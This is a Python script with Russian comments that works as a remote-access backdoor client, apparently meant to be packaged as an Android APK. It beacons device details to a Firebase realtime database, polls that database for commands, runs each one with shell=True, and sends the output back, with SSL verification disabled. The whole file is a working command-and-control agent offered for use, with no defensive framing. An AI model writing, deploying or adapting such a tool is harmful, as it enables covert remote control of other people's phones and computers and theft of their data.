import requests
import subprocess
import time
import os
import platform
import urllib3

# Отключаем ворчание про SSL для стабильности в APK
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ТВОЯ ССЫЛКА
BASE_URL = "https://test-73273-default-rtdb.europe-west1.firebasedatabase.app/"
DB_URL = f"{BASE_URL}commands.json"
RES_URL = f"{BASE_URL}results.json"
STATUS_URL = f"{BASE_URL}phone_status.json"

last_cmd_id = None
current_os = platform.system() # Определяем: 'Windows', 'Linux' (Android) или 'Darwin'

def start_client():
    global last_cmd_id
    print(f"[*] Система: {current_os}. Ожидание команд...")
    
    while True:
        try:
            # 1. МАЯК: пишем статус в базу
            requests.put(STATUS_URL, json={
                "last_seen": time.time(),
                "os": current_os,
                "device": platform.node()
            }, verify=False, timeout=10)
            
            # 2. ПОЛУЧЕНИЕ КОМАНДЫ
            response = requests.get(DB_URL, verify=False, timeout=10).json()
            
            if response and response.get("id") != last_cmd_id:
                cmd = response.get("cmd").strip()
                last_cmd_id = response.get("id")
                
                print(f"[+] Выполняю: {cmd}")

                # --- ЛОГИКА АДАПТАЦИИ ПОД ОС ---
                if current_os == "Windows":
                    # Если ты привык к 'ls', подменяем на 'dir' для Windows
                    if cmd == "ls": cmd = "dir /b"
                    encoding = "cp866" # Кодировка консоли Windows
                else:
                    encoding = "utf-8" # Кодировка Android/Linux

                # Выполнение
                proc = subprocess.Popen(cmd, shell=True, 
                                        stdout=subprocess.PIPE, 
                                        stderr=subprocess.PIPE)
                stdout, stderr = proc.communicate()
                
                # Декодируем с учетом ОС
                output = (stdout + stderr).decode(encoding, errors='replace')
                if not output: output = "Done (no output)"

                # 3. ОТПРАВКА РЕЗУЛЬТАТА
                requests.put(RES_URL, json={
                    "status": "done",
                    "output": output,
                    "os_source": current_os
                }, verify=False, timeout=10)
                print("[*] Результат отправлен.")

        except Exception as e:
            print(f"[-] Ошибка: {e}")
            
        time.sleep(5)

if __name__ == "__main__":
    start_client()
